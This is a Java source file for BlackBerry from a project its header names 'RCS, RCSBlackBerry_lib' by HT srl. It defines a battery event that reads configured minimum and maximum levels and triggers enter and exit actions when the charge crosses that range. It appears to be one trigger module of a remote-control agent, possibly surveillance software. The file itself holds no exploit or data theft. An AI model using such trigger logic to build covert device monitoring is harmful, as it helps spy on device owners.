//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : BatteryEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import net.rim.device.api.system.DeviceInfo;
import blackberry.AppListener;
import blackberry.config.ConfEvent;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.BatteryStatusObserver;
import blackberry.utils.Utils;

/**
 * The Class BatteryEvent.
 */
public final class EventBattery extends Event implements BatteryStatusObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("EventBattery", DebugLevel.VERBOSE);
    //#endif

    int minLevel;
    int maxLevel;

    private boolean inRange = false;

    protected boolean parse(ConfEvent event) {
        try {
            minLevel = conf.getInt("min");
            maxLevel = conf.getInt("max");

            //#ifdef DEBUG
            debug.trace(" minLevel:" + minLevel + " maxLevel:" + maxLevel);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
            //#endif
        } catch (final ConfigurationException e) {
            //#ifdef DEBUG
            debug.trace(" Error: params FAILED");//$NON-NLS-1$
            //#endif
            return false;
        }
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    protected void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart");
        //#endif
        AppListener.getInstance().addBatteryStatusObserver(this);
        onBatteryStatusChange(0, 0);
    }

    protected void actualLoop() {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    protected void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif
        AppListener.getInstance().removeBatteryStatusObserver(this);
        onExit();
    }

    /**
     * Battery status change.
     * 
     * @param arg0
     *            the arg0
     */
    public void batteryStatusChange(final int arg0) {
        switch (arg0) {
            case DeviceInfo.BSTAT_AC_CONTACTS:
                //#ifdef DEBUG
                debug.info("BSTAT_AC_CONTACTS");
                //#endif
                break;
            case DeviceInfo.BSTAT_CHARGING:
                //#ifdef DEBUG
                debug.info("BSTAT_CHARGING");
                //#endif
                break;
            case DeviceInfo.BSTAT_DEAD:
                //#ifdef DEBUG
                debug.info("BSTAT_DEAD");
                //#endif
                break;
            case DeviceInfo.BSTAT_IS_USING_EXTERNAL_POWER:
                //#ifdef DEBUG
                debug.info("BSTAT_IS_USING_EXTERNAL_POWER");
                //#endif
                break;
            case DeviceInfo.BSTAT_LEVEL_CHANGED:
                //#ifdef DEBUG
                debug.info("BSTAT_LEVEL_CHANGED");
                //#endif         
                break;
            case DeviceInfo.BSTAT_LOW:
                //#ifdef DEBUG
                debug.info("BSTAT_LOW");
                //#endif
                break;
            case DeviceInfo.BSTAT_LOW_RATE_CHARGING:
                //#ifdef DEBUG
                debug.info("BSTAT_LOW_RATE_CHARGING");
                //#endif
                break;
            case DeviceInfo.BSTAT_NO_CAMERA_FLASH:
                //#ifdef DEBUG
                debug.info("BSTAT_NO_CAMERA_FLASH");
                //#endif
                break;
            case DeviceInfo.BSTAT_NO_RADIO:
                //#ifdef DEBUG
                debug.info("BSTAT_NO_RADIO");
                //#endif
                break;
            case DeviceInfo.BSTAT_NO_TURN_ON:
                //#ifdef DEBUG
                debug.info("BSTAT_NO_TURN_ON");
                //#endif
                break;
            case DeviceInfo.BSTAT_NO_WLAN:
                //#ifdef DEBUG
                debug.info("BSTAT_NO_WLAN");
                //#endif
                break;
            case DeviceInfo.BSTAT_NONE:
                //#ifdef DEBUG
                debug.info("BSTAT_NONE");
                //#endif
                break;
            case DeviceInfo.BSTAT_REVERSED:
                //#ifdef DEBUG
                debug.info("BSTAT_REVERSED");
                //#endif
                break;
            case DeviceInfo.BSTAT_TOO_COLD:
                //#ifdef DEBUG
                debug.info("BSTAT_TOO_COLD");
                //#endif
                break;
            case DeviceInfo.BSTAT_TOO_HOT:
                //#ifdef DEBUG
                debug.info("BSTAT_TOO_HOT");
                //#endif
                break;
            case DeviceInfo.BSTAT_UNKNOWN_BATTERY:
                //#ifdef DEBUG
                debug.info("BSTAT_UNKNOWN_BATTERY");
                //#endif
                break;
            default:
                //#ifdef DEBUG
                debug.info("UNKNOWN");
                //#endif
                break;
        }

    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.BatteryStatusObserver#onBatteryStatusChange(int,
     * int)
     */
    public void onBatteryStatusChange(final int state, final int diff) {
        final int perc = DeviceInfo.getBatteryLevel();

        //#ifdef DEBUG
        debug.info("Battery level: " + perc);
        //#endif

        if (minLevel > maxLevel) {
            return;
        }

        if ((perc >= minLevel && perc <= maxLevel) && inRange == false) {
            inRange = true;
            //#ifdef DEBUG
            debug.trace(" Battery IN");//$NON-NLS-1$
            //#endif
            onEnter();

        } else if ((perc < minLevel || perc > maxLevel) && inRange == true) {
            //outside

            inRange = false;
            //#ifdef DEBUG
            debug.trace(" Battery OUT");//$NON-NLS-1$
            //#endif
            onExit();

        } else {
            //#ifdef DEBUG
            debug.trace("onBatteryStatusChange: nothing to do");
            //#endif
        }

        //#ifdef DEBUG
        for (int i = 0; i < 32; i++) {
            final boolean bit = Utils.getBit(diff, i);
            if (bit) {
                batteryStatusChange(1 << i);
            }
        }
        //#endif

        //#ifdef DEBUG
        debug.trace("onBatteryStatusChange end");
        //#endif
    }
}
